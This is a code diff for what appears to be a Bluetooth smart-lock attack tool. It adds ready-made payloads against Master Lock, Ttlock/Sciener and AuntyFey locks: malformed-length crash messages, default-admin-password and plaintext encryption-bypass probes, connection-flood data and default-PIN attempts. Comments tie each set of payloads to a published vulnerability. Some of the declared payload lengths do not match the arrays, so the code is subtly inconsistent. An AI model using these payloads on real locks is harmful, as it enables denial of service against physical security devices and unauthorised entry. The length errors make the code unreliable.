@@ -62,6 +62,78 @@ static const LockTestCommand tests_tapplock[] = {
     {"PIN: 000000 (bin)", cmd_000000_bin, 6},
 };
 
+// Master Lock D1000 — WOOT 2025 replay/DoS attack
+// Service: 94e00001-5d5b-11e4-846f-4437e6b36dfb (128-bit, matched by name)
+// Malformed message DoS: encoded length 610-656 causes crash
+static const uint8_t cmd_mlock_malformed_610[] = {
+    0x01, 0x00, 0x02, 0x62, // Header with encoded length 610
+    0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, // Padding
+};
+static const uint8_t cmd_mlock_malformed_656[] = {
+    0x01, 0x00, 0x02, 0x90, // Header with encoded length 656
+    0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
+};
+static const uint8_t cmd_mlock_keepalive[] = {0x01}; // KeepAlive command
+
+static const LockTestCommand tests_masterlock[] = {
+    {"KeepAlive probe", cmd_mlock_keepalive, 1},
+    {"Malformed len=610", cmd_mlock_malformed_610, 12},
+    {"Malformed len=656", cmd_mlock_malformed_656, 12},
+};
+
+// Ttlock / Sciener platform — service UUID 0x1910
+// Chars: FFF2 (write no-response), FFF4 (notify)
+static const uint8_t cmd_ttlock_header[] = {0x7F, 0x5A, 0x05, 0x03, 0x02, 0x00, 0x10, 0x00, 0x22};
+static const uint8_t cmd_ttlock_admin_check[] = {
+    0x7F, 0x5A, 0x05, 0x03, 0x02, 0x00, 0x10, 0x00, 0x22,
+    0x41, // admin check opcode
+    0x55, // encrypt flag: plaintext
+    0x0A, // data length: 10
+    0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, // "0000000000" (default adminPs)
+    0x00, // checksum placeholder
+    0x0D, 0x0A, // terminator
+};
+static const uint8_t cmd_ttlock_unencrypted_probe[] = {
+    0x7F, 0x5A, 0x05, 0x03, 0x02, 0x00, 0x10, 0x00, 0x22,
+    0x41, // admin check
+    0x55, // plaintext flag
+    0x06, // short payload (< 16 bytes, may bypass encryption)
+    0x31, 0x32, 0x33, 0x34, 0x35, 0x36, // "123456"
+    0xB7, // checksum
+    0x0D, 0x0A,
+};
+
+static const LockTestCommand tests_ttlock[] = {
+    {"Admin check (default)", cmd_ttlock_admin_check, 24},
+    {"Plaintext probe", cmd_ttlock_unencrypted_probe, 22},
+    {"PIN: 000000", cmd_000000, 6},
+    {"PIN: 123456", cmd_123456, 6},
+};
+
+// AuntyFey padlock — CVE-2025-34462 connection flood DoS
+// Identified by custom service UUID 00000001-0000-1001-8001-00805f9b07d0
+static const uint8_t cmd_auntyfey_fuzz1[] = {
+    0xDE, 0xAD, 0xBE, 0xEF, 0xCA, 0xFE, 0xBA, 0xBE,
+    0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08,
+    0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x0E, 0x0F, 0x10,
+    0x11, 0x12, 0x13, 0x14, 0x15, 0x16, 0x17, 0x18,
+    0x19, 0x1A, 0x1B, 0x1C, 0x1D, 0x1E, 0x1F, 0x20,
+};
+static const uint8_t cmd_auntyfey_fuzz2[] = {
+    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
+    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
+    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
+    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
+    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
+};
+
+static const LockTestCommand tests_auntyfey[] = {
+    {"Random data flood", cmd_auntyfey_fuzz1, 40},
+    {"All-FF flood", cmd_auntyfey_fuzz2, 40},
+    {"PIN: 000000", cmd_000000, 6},
+    {"PIN: 123456", cmd_123456, 6},
+};
+
 // ── Lock profiles ────────────────────────────────────────────────────
 
 static const LockProfile profiles[] = {
@@ -109,6 +181,33 @@ static const LockProfile profiles[] = {
         .tests = tests_tapplock,
         .test_count = 3,
         .description = "Tapplock\nMAC used as crypto key\n(manual key derivation needed)",
+    },
+    {
+        .name = "Master Lock D1000",
+        .name_prefix = "Master Lock",
+        .service_uuid = 0,
+        .target_char_uuid = 0,
+        .tests = tests_masterlock,
+        .test_count = 3,
+        .description = "Master Lock BLE Deadbolt\nWOOT 2025: replay attack\n+ malformed msg DoS",
+    },
+    {
+        .name = "Ttlock / Sciener",
+        .name_prefix = "S202",
+        .service_uuid = 0x1910,
+        .target_char_uuid = 0xFFF2,
+        .tests = tests_ttlock,
+        .test_count = 4,
+        .description = "Ttlock/Sciener platform\nCVE-2023-6960/7003-7017\nEncryption downgrade,\nplaintext cmd processing",
+    },
+    {
+        .name = "AuntyFey Padlock",
+        .name_prefix = "AuntyFey",
+        .service_uuid = 0,
+        .target_char_uuid = 0,
+        .tests = tests_auntyfey,
+        .test_count = 4,
+        .description = "AuntyFey BLE padlock\nCVE-2025-34462\nConnection flood DoS +\nrandom data write flood",
     },
 };
 
